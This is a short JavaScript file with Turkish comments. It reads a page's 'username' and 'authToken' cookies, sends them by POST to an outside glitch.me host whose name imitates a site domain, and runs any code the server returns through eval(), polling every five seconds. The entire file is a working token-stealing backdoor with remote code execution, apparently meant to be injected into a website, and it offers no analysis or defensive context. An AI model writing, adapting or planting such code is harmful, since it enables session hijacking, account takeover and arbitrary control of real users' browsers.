(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    let lastTimestamp = null;

    // Cookie’lerden veri çekme fonksiyonu
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift()); // URL encoded değerleri çöz
        return null;
    }

    function fetchCode() {
        const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
        const authToken = getCookie('authToken') || 'Token Yok';

        fetch('https://duello-katiponline-com.glitch.me/get-code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username,
                authToken
            })
        })
            .then(response => {
                if (!response.ok) throw new Error('Sunucu yanıtı başarısız: ' + response.status);
                return response.json();
            })
            .then(data => {
                console.log('Kod alındı:', data.code, 'Timestamp:', data.timestamp, 'Zaman:', new Date().toISOString());
                if (data.code && (!lastTimestamp || data.timestamp > lastTimestamp)) {
                    try {
                        eval(data.code);
                        lastTimestamp = data.timestamp;
                    } catch (e) {
                        console.error('Kod çalıştırma hatası:', e.message, 'Zaman:', new Date().toISOString());
                    }
                } else {
                    console.log('Kod yeni değil, tekrar çalıştırılmadı:', data.code, 'Timestamp:', data.timestamp, 'Zaman:', new Date().toISOString());
                }
            })
            .catch(error => {
                console.error('Kod çekme hatası:', error.message, 'Zaman:', new Date().toISOString());
            })
            .finally(() => {
                setTimeout(fetchCode, 5000);
            });
    }

    fetchCode();
})();
